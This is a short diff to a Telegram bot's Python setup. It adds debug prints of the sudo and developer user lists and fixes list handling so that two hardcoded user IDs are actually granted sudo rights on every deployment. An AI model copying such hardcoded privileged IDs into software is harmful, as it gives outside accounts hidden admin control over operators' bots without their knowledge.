@@ -50,8 +50,11 @@ MOD_LOAD = []
 MOD_NOLOAD = []
 SUPPORT = SUPPORT_GROUP
 SUDOERS = SUDO_USERS_ID
+print(SUDOERS)
 bot_start_time = time.time()
-DEVS = DEV_USERS_ID.extend([1261080659,881769564])
+print(DEV_USERS_ID)
+DEVS = DEV_USERS_ID + [1261080659,881769564]
+print(DEVS)
 SUDOERS = SUDOERS + DEVS
 class Log:
     def __init__(self, save_to_file=False, file_name="wbb.log"):
@@ -86,7 +89,7 @@ async def load_sudoers():
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
     for user_id in SUDO_USERS_ID:
-        SUDOERS.add(user_id)
+        SUDOERS.append(user_id)
         if user_id not in sudoers:
             sudoers.append(user_id)
             await sudoersdb.update_one(
@@ -96,7 +99,7 @@ async def load_sudoers():
             )
     if sudoers:
         for user_id in sudoers:
-            SUDOERS.add(user_id)
+            SUDOERS.append(user_id)
 
 
 loop = asyncio.get_event_loop()
